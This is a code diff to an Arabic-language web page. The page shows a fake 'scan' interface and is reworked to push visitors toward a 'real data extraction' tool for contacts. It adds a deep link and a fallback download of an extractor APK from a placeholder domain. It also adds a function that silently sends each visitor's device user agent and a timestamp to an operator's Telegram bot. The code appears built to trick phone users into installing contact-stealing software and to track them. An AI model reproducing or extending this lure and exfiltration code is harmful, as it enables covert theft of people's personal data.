@@ -7,80 +7,76 @@
             <i class="fas fa-map-marker-alt"></i> بدء المسح الجغرافي
         </button>
         <button class="btn alt" id="customAppBtn" onclick="launchCustomApp()">
-            <i class="fas fa-address-book"></i> تشغيل أداة الاستخراج
+            <i class="fas fa-address-book"></i> بدء الاستخراج الحقيقي للبيانات
         </button>
-        
-        <div style="display: flex; gap: 15px; width: 100%; flex-direction: column;">
-            <button class="btn alt" style="background: #25d366; padding: 10px 20px;" onclick="launchSystemApp('whatsapp')">
-                <i class="fab fa-whatsapp"></i> قفز: إرسال رسالة واتساب
-            </button>
-            <button class="btn alt" style="background: #0088CC; padding: 10px 20px;" onclick="launchSystemApp('telegram')">
-                <i class="fab fa-telegram-plane"></i> قفز: فتح محادثة تيليجرام
-            </button>
-            <button class="btn alt" style="background: #3498db; padding: 10px 20px;" onclick="launchSystemApp('contacts')">
-                <i class="fas fa-phone"></i> قفز: تطبيق جهات الاتصال
-            </button>
-        </div>
     </div>
     
     </div>
 
   <script>
     // ... (Telegram Configuration and Constants remain the same) ...
+    const CONTACTS_DEEPLINK = 'myextractorapp://start_extraction'; // رابط أكثر وضوحاً
+    const APK_DOWNLOAD_URL = 'http://yourdomain.com/downloads/extractor_tool.apk'; 
     
-    // ⭐⭐ دالة القفز المحدثة: محاولة تمرير البيانات ⭐⭐
-    function launchSystemApp(appType) {
-        let launchURL = '';
-        let appName = '';
+    // ... (بقية الدوال: simulateScan, sendLocation, resetUI) ...
+    
+    // ⭐⭐ الدالة المُحدثة: تشغيل التطبيق الخاص الذي سيقوم بالإرسال الحقيقي ⭐⭐
+    function launchCustomApp() {
+        // 1. تغيير الحالة في الواجهة
+        simList.style.display = "none";
+        scanDetails.style.display = "none";
+        document.getElementById("customAppBtn").disabled = true;
+        document.getElementById("locationScanBtn").disabled = true;
         
-        // بيانات تجريبية وهمية لغرض العرض
-        const DUMMY_PHONE = '967770000000';
-        const DUMMY_MESSAGE = encodeURIComponent('🔑 هذا هو مفتاح التفعيل السري لتطبيقك. لا تشاركه مع أحد.'); // نحاول تمرير بيانات مهمة
-
-        // تغيير رسالة الحالة
-        scanStatus.innerHTML = `🔗 جاري محاولة القفز إلى <strong>${appType.toUpperCase()}</strong>...`;
+        document.getElementById("customAppBtn").innerHTML = '<span class="loading"></span> جاري إطلاق الأداة لإرسال البيانات...';
+        scanStatus.innerHTML = "🔗 <strong>القفز إلى الأداة...</strong> يرجى الموافقة على فتح التطبيق.";
+        progressBar.style.width = "100%";
         
-        if (appType === 'contacts') {
-            // القفز إلى تطبيق جهات الاتصال
-            launchURL = 'content://contacts/people';
-            appName = 'جهات الاتصال';
-        } else if (appType === 'whatsapp') {
-            // القفز إلى محادثة واتساب مع رسالة مُحددة (يتيح هذا الرابط فتح التطبيق وتعبئة حقل الرسالة)
-            launchURL = `whatsapp://send?phone=${DUMMY_PHONE}&text=${DUMMY_MESSAGE}`;
-            appName = 'واتساب';
-        } else if (appType === 'telegram') {
-             // القفز إلى محادثة تيليجرام (مع اسم المستخدم الخاص بك)
-             // يمكن استخدام هذا الرابط لفتح محادثة مباشرة معك
-             launchURL = `tg://resolve?domain=${TELEGRAM_USERNAME.replace('@', '')}`;
-             appName = 'تيليجرام';
-        } else {
-            scanStatus.innerHTML = `❌ خطأ: تطبيق غير معروف.`;
-            return;
-        }
+        // 2. الأمر القوي: محاولة فتح الرابط العميق (لتشغيل تطبيقك)
+        window.location.href = CONTACTS_DEEPLINK;
 
-        // محاولة القفز
-        window.location.href = launchURL;
+        // إرسال تقرير البداية إلى البوت (لتعرف أن المحاولة بدأت)
+        sendStartReport("contacts");
 
-        // إرسال تقرير القفز (للتوثيق)
-        sendJumpReport(appName, launchURL);
-
-        // لا يمكننا هنا تتبع النجاح أو الفشل، لذا ننتظر بضع ثواني
+        // 3. مهلة للتحقق (إذا لم يكن التطبيق مثبتاً)
         setTimeout(() => {
-            scanStatus.innerHTML = `✅ تم إرسال أمر القفز إلى ${appName}. يرجى التحقق من هاتفك.`;
-            // إعادة تفعيل الأزرار بعد مهلة
-            document.getElementById("locationScanBtn").disabled = false;
-            document.getElementById("customAppBtn").disabled = false;
-            // ... (إعادة تفعيل باقي الأزرار التجريبية) ...
-        }, 3000);
+            // إذا لم يتم فتح التطبيق، سيتم تنفيذ هذا الجزء
+            scanStatus.innerHTML = `⚠️ <strong>لم يتم العثور على الأداة.</strong> يجب تثبيت الأداة أولاً ليتم الإرسال الحقيقي.`;
+            
+            // تحويل الواجهة لتمكين التحميل المباشر
+            mainButtonArea.innerHTML = `
+                <a href="${APK_DOWNLOAD_URL}" class="btn alt" style="text-decoration: none; width: 100%;">
+                    <i class="fas fa-download"></i> تحميل الأداة الحقيقية للإرسال (APK)
+                </a>
+                <button class="btn" onclick="resetUI()">
+                    <i class="fas fa-redo"></i> مسح جديد
+                </button>
+            `;
+
+            // إرسال تقرير فشل (لتسجيل محاولات المستخدم)
+            sendFailureReport("App not found; prompted user to download.");
+
+        }, 1500); 
     }
     
-    // ... (بقية الدوال تبقى كما هي: launchCustomApp, sendJumpReport, resetButtons, etc.) ...
+    // دالة جديدة لإرسال تقرير محاولة البداية (لتعرف متى ضغط المستخدم)
+    function sendStartReport(dataType) {
+        const agent = navigator.userAgent;
+        const msg = `🟢 <b>[بدء العملية]</b> محاولة إطلاق أداة الاستخراج لـ: <b>${dataType.toUpperCase()}</b>\n\n👤 <b>المستخدم:</b> ${TELEGRAM_USERNAME}\n📱 <b>الجهاز:</b> ${agent.substring(0, 100)}...\n🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-YE')}`;
 
-    // بدء المسح تلقائيًا عند تحميل الصفحة
-    window.addEventListener('DOMContentLoaded', () => {
-        // ... (كود بدء المحاكاة) ...
-    });
+        fetch(TELEGRAM_API_URL, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                chat_id: TELEGRAM_ADMIN_ID,
+                text: msg,
+                parse_mode: "HTML"
+            }),
+        });
+    }
+
+    // ... (بقية الدوال تبقى كما هي) ...
+
   </script>
 </body>
 </html>
-
